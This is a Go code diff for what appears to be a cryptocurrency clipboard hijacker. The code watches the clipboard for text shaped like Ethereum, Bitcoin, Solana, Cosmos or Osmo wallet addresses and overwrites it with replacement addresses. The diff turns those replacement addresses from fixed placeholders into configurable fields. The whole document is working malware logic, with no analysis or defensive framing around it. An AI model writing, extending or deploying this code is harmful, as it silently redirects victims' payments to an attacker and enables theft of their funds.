@@ -9,7 +9,15 @@ import (
 	"github.com/atotto/clipboard"
 )
 
-func Write() {
+type WalletTypes struct {
+	ETH_WALLET    string
+	BTC_WALLET    string
+	SOLANA_WALLET string
+	COSMOS_WALLET string
+	OSMO_WALLET   string
+}
+
+func Write(wallets WalletTypes) {
 	previousContent, err := clipboard.ReadAll()
 	if err != nil {
 		fmt.Printf("Error reading clipboard: %v\n", err)
@@ -26,19 +34,19 @@ func Write() {
 		if currentContent != previousContent {
 			// ETHEREUM
 			if len(currentContent) == 42 && strings.HasPrefix(currentContent, "0x") {
-				writeContent("ETH wallet")
+				writeContent(wallets.ETH_WALLET)
 				// BITCOIN
 			} else if len(currentContent) == 42 && strings.HasPrefix(currentContent, "bc") {
-				writeContent("BTC wallet")
+				writeContent(wallets.BTC_WALLET)
 				// SOLANA
 			} else if len(currentContent) == 44 && containsNumbersAndLetters(currentContent) {
-				writeContent("SOLANA wallet")
+				writeContent(wallets.SOLANA_WALLET)
 				// COSMOS
 			} else if len(currentContent) == 45 && strings.HasPrefix(currentContent, "cosmos") {
-				writeContent("COSMOS wallet")
+				writeContent(wallets.COSMOS_WALLET)
 				// OSMO
 			} else if len(currentContent) == 43 && strings.HasPrefix(currentContent, "osmo") {
-				writeContent("OSMO wallet")
+				writeContent(wallets.OSMO_WALLET)
 			}
 			previousContent = currentContent
 		}
